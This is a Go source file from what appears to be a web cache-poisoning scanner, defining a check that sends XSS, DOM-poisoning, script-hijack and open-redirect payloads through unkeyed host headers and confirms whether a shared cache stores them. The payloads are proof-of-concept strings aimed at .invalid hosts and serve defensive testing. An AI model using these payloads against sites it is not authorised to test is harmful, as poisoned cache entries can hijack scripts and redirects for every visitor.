package security

import (
	"context"
	"fmt"
	"net/http"
	"strings"

	"github.com/cerberauth/harnessx"
	"github.com/cerberauth/harnessx/checkdef"

	"github.com/cerberauth/cache-detective/cache/checkbase"
)

// --- Unkeyed-input exploitation impact assessment (§5) ----------------------

// UnkeyedImpactDef goes a step past UnkeyedHeaderCheck's generic "this value
// comes back unmodified" mining: for the small set of headers known to
// control an origin's idea of its own hostname, it tries payloads crafted to
// demonstrate a *specific, concrete* exploitation outcome — reflected XSS,
// open redirect, DOM/JS-config poisoning, or a hijacked script import —
// rather than just proving the value is unkeyed. Kettle's 2018 "Practical
// Web Cache Poisoning" documents all four against real deployments: Red
// Hat's homepage (X-Forwarded-Host reflected into absolute URLs),
// unity3d.com (X-Host), data.gov (X-Forwarded-Host inside an i18n JSON
// config consumed by inline JS), and goodhire.com (X-Forwarded-Server).
var UnkeyedImpactDef = checkbase.CheckDef{
	ID:          string(checkbase.CheckIDUnkeyedImpact),
	Name:        "Unkeyed-Input Exploitation Impact",
	Description: "For each host-controlling header left out of the cache key, tries payloads that demonstrate a concrete exploitation outcome rather than mere reflection: reflected XSS into an absolute URL/meta tag, open redirect via X-Forwarded-Host + X-Forwarded-Proto/Scheme, DOM-based poisoning via an inline JSON/JS config, and a hijacked <script src>. Each is confirmed the Param Miner way — a follow-up plain request to the same cache-buster-isolated URL must still be served the payload back — proving the shared cache, not just the live origin render, carries it to other callers (Kettle, \"Practical Web Cache Poisoning\", 2018).",
	Tags:        []string{securityTag, cachePoisoningTag},
	// DependsOn CPDoSCheck, the tail of the §5 poison chain, joining at the
	// same level as entanglement/delimiter-mapper/normalization/key-collision:
	// every probe here lives on its own cache-buster-isolated URL and never
	// touches the resource's canonical entry, so running concurrently with
	// those is safe.
	DependsOn:  []string{string(checkbase.CheckIDDiscovery), string(checkbase.CheckIDCPDoS)},
	CVSSVector: cvssPoisoning,
	CVSSScore:  9.3,
	CWEID:      "CWE-79",
	OWASP:      owaspMisconfig,
}

var UnkeyedImpactCheck = checkdef.NewResourceCheck(UnkeyedImpactDef, runUnkeyedImpact)

// hostControllingHeaders are the unkeyed headers tried against every
// impact probe below — an origin that honors any of these to build an
// absolute URL, a redirect target, or an asset import gives an attacker
// that same leverage through whichever shared cache stores the result.
var hostControllingHeaders = []string{
	headerXForwardedHost,
	"X-Forwarded-Server",
	"X-Host",
	"X-Original-URL",
	"X-Rewrite-URL",
}

// impactProbe is one exploitation-impact class: a payload value tried on
// each of hostControllingHeaders, and a detector deciding whether a
// response demonstrates that specific impact.
type impactProbe struct {
	kind     string
	title    string
	describe func(header string) string
	severity string
	payload  string
	detect   func(ex checkbase.Exchange) bool
}

func runUnkeyedImpact(ctx context.Context, target harnessx.Target, resource harnessx.Resource, _ harnessx.ResultStore) (harnessx.Result, error) {
	if !aggressiveGate(target) {
		return harnessx.Result{}, nil
	}
	pctx := target.Data.(*checkbase.ProbeCtx)
	budget := pctx.MaxAggressiveRequests

	probes := []impactProbe{
		xssImpactProbe(),
		domPoisoningImpactProbe(),
		scriptHijackImpactProbe(),
	}

	var obs []harnessx.Observation
	for _, p := range probes {
		if ob, found := runImpactProbe(ctx, pctx, resource, &budget, p); found {
			obs = append(obs, ob)
		}
	}
	if ob, found := runOpenRedirectProbe(ctx, pctx, resource, &budget); found {
		obs = append(obs, ob)
	}

	return harnessx.Result{Observations: obs}, nil
}

// xssImpactProbe demonstrates reflected XSS: a host value that breaks out
// of an attribute (the common shape for a reflected absolute URL or
// Open Graph meta tag) is only "proven" exploitable if it reaches the
// response unescaped — an app that HTML-escapes the header would turn
// this into harmless "&lt;svg..." text instead.
func xssImpactProbe() impactProbe {
	payload := `cd-impact.invalid"><svg/onload=alert(document.domain)>`
	return impactProbe{
		kind:     "xss",
		title:    "Reflected XSS via unkeyed header",
		severity: checkbase.SeverityCritical,
		payload:  payload,
		describe: func(header string) string {
			return fmt.Sprintf("a host value crafted to break out of an attribute context (%q) was reflected unescaped via the unkeyed %s header — if the origin builds an absolute URL/canonical link/Open Graph tag from it, this is reflected XSS stored in a shared cache entry", payload, header)
		},
		detect: func(ex checkbase.Exchange) bool {
			return strings.Contains(string(ex.Body), payload)
		},
	}
}

// domPoisoningImpactProbe demonstrates DOM-based poisoning: a host value
// crafted to break out of a JS string context lands, unescaped, inside an
// inline <script> block — the data.gov i18n-JSON precedent from Kettle's
// 2018 research.
func domPoisoningImpactProbe() impactProbe {
	payload := `cd-impact.invalid";alert(document.domain);//`
	return impactProbe{
		kind:     "dom",
		title:    "DOM-based cache poisoning via unkeyed header",
		severity: checkbase.SeverityCritical,
		payload:  payload,
		describe: func(header string) string {
			return fmt.Sprintf("a host value crafted to break out of a JS string literal (%q) was reflected unescaped via the unkeyed %s header, landing inside an inline script block — a value an inline JSON/JS config consumes verbatim turns this into DOM-based cache poisoning", payload, header)
		},
		detect: func(ex checkbase.Exchange) bool {
			body := string(ex.Body)
			idx := strings.Index(strings.ToLower(body), "<script")
			if idx < 0 {
				return false
			}
			return strings.Contains(body[idx:], payload)
		},
	}
}

// scriptHijackImpactProbe demonstrates a hijacked script/resource import: a
// bare attacker-controlled host, reflected into a <script src="...">
// (or any src=) attribute, lets an attacker serve arbitrary JS to every
// visitor the poisoned cache entry reaches.
func scriptHijackImpactProbe() impactProbe {
	const host = "cd-impact-hijack.invalid"
	return impactProbe{
		kind:     "script-hijack",
		title:    "Script import hijack via unkeyed header",
		severity: checkbase.SeverityCritical,
		payload:  host,
		describe: func(header string) string {
			return fmt.Sprintf("the attacker-controlled host %q, sent via the unkeyed %s header, was reflected into a script/resource import (src=) attribute — an attacker-hosted script served under a legitimate, cached URL", host, header)
		},
		detect: func(ex checkbase.Exchange) bool {
			body := strings.ToLower(string(ex.Body))
			for _, scheme := range []string{"http://", "https://", "//"} {
				if strings.Contains(body, `src="`+scheme+host) || strings.Contains(body, `src='`+scheme+host) {
					return true
				}
			}
			return false
		},
	}
}

// runImpactProbe tries p.payload via every hostControllingHeaders candidate
// on a cache-buster-isolated URL, stopping at the first header whose
// response matches p.detect and whose unmodified follow-up request on that
// same isolated URL still matches — proof the shared cache, not just the
// live render, serves the payload to other callers.
func runImpactProbe(ctx context.Context, pctx *checkbase.ProbeCtx, resource harnessx.Resource, budget *int, p impactProbe) (harnessx.Observation, bool) {
	for _, header := range hostControllingHeaders {
		if *budget < 2 {
			return harnessx.Observation{}, false
		}
		busterProbe, err := checkbase.NewCacheBusterProbe(resource.URL, pctx)
		if err != nil {
			continue
		}
		poisonHeader := checkbase.MergeHeader(busterProbe.Header, http.Header{header: {p.payload}})
		poisonReq, err := checkbase.NewRequest(ctx, busterProbe.URL, pctx, poisonHeader)
		if err != nil {
			continue
		}

		*budget--
		poisoned, err := checkbase.Do(ctx, pctx, poisonReq)
		if err != nil || !p.detect(poisoned) {
			continue
		}

		if *budget < 1 {
			return harnessx.Observation{}, false
		}
		*budget--
		confirm, err := fetchExchangeWithHeader(ctx, pctx, busterProbe.URL, busterProbe.Header)
		if err != nil || !p.detect(confirm) {
			continue
		}

		return harnessx.Observation{
			CheckID:     checkbase.CheckIDUnkeyedImpact,
			ResourceID:  resource.ID,
			Title:       p.title,
			Description: p.describe(header),
			Evidence:    fmt.Sprintf("injected %s: %s", header, p.payload),
			Metadata:    map[string]string{checkbase.SeverityKey: p.severity},
		}, true
	}
	return harnessx.Observation{}, false
}

// openRedirectHosts/openRedirectSchemeHeaders are the X-Forwarded-Host +
// X-Forwarded-Scheme/Proto combinations tried by runOpenRedirectProbe —
// an origin that builds a redirect target from both headers gives an
// attacker full control over the scheme and host a victim is redirected to.
var openRedirectSchemeHeaders = []string{"X-Forwarded-Proto", "X-Forwarded-Scheme"}

// runOpenRedirectProbe tries X-Forwarded-Host alongside each of
// openRedirectSchemeHeaders, checking for a redirect response whose
// Location carries the injected host back — then confirms the same
// cache-buster-isolated URL still redirects there on a plain follow-up.
func runOpenRedirectProbe(ctx context.Context, pctx *checkbase.ProbeCtx, resource harnessx.Resource, budget *int) (harnessx.Observation, bool) {
	const host = "cd-impact-redirect.invalid"
	detect := func(ex checkbase.Exchange) bool {
		return ex.StatusCode >= 300 && ex.StatusCode < 400 && strings.Contains(ex.Header.Get("Location"), host)
	}

	for _, schemeHeader := range openRedirectSchemeHeaders {
		if *budget < 2 {
			return harnessx.Observation{}, false
		}
		busterProbe, err := checkbase.NewCacheBusterProbe(resource.URL, pctx)
		if err != nil {
			continue
		}
		poisonHeader := checkbase.MergeHeader(busterProbe.Header, http.Header{
			headerXForwardedHost: {host},
			schemeHeader:         {"https"},
		})
		poisonReq, err := checkbase.NewRequest(ctx, busterProbe.URL, pctx, poisonHeader)
		if err != nil {
			continue
		}

		*budget--
		poisoned, err := checkbase.Do(ctx, pctx, poisonReq)
		if err != nil || !detect(poisoned) {
			continue
		}

		if *budget < 1 {
			return harnessx.Observation{}, false
		}
		*budget--
		confirm, err := fetchExchangeWithHeader(ctx, pctx, busterProbe.URL, busterProbe.Header)
		if err != nil || !detect(confirm) {
			continue
		}

		return harnessx.Observation{
			CheckID:     checkbase.CheckIDUnkeyedImpact,
			ResourceID:  resource.ID,
			Title:       "Open redirect via unkeyed X-Forwarded-Host/" + schemeHeader,
			Description: fmt.Sprintf("X-Forwarded-Host combined with %s produced a redirect pointing at the injected host %q, and a follow-up plain request to the same cache-buster-isolated URL was redirected there too — the cache serves an attacker-chosen redirect target to every caller", schemeHeader, host),
			Evidence:    fmt.Sprintf("X-Forwarded-Host: %s, %s: https -> Location: %s", host, schemeHeader, poisoned.Header.Get("Location")),
			Metadata:    map[string]string{checkbase.SeverityKey: checkbase.SeverityHigh},
		}, true
	}
	return harnessx.Observation{}, false
}
